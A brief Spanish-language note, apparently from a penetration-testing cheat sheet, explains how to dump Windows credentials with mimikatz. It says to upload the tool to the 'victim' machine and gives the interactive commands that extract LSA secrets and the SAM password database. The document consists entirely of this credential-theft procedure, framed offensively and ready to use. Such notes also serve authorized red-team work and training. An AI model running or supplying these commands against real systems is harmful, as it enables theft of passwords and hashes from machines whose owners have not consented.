# Dumpear credenciales con mimikatz
Subimos el mimikatz al equipo victima, lo ejecutamos con `mimikatz.exe` y en la sesión interactiva hacemos lo siguiente para dumpear el lsa:
```
lsadump::lsa /patch
```
También podemos dumpear la SAM con el siguiente comando
```
lsadump::sam /patch
```
